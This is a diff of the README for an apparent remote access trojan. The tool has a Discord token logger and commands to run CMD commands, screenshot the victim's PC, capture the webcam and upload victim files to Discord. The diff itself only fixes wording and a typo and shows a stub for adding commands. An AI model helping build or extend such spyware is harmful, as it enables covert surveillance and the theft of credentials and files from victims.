@@ -19,8 +19,8 @@ Server connects to given ip & port. Also has discord token logger.
             "5": Execute a link in web browser.
             "6": Execute hotkey.
             "7": Execute CMD commands.
-            "8": Take screenshot of victim PC and send to discord.
-            "9": Take shot of victim webcam and send to discord.
+            "8": Take screenshot of victim PC and send to discord server.
+            "9": Take shot of victim webcam and send to discord server.
             "10": Upload files of victim and send to discord. (upto 7mb).
 
 You can always add more commands if you like.
@@ -50,7 +50,7 @@ if incoming_message[0] == "{name}":
 Replace {number} with your command prefix & replace {name} with your command name.
 
 # To add a command (Client.py)
-Inside of the while loop, just below the incoming_message variable write the folling code
+Inside of the while loop, just below the incoming_message variable write the following code
 
 ```Python
 if incoming_message[0] == "{name}":
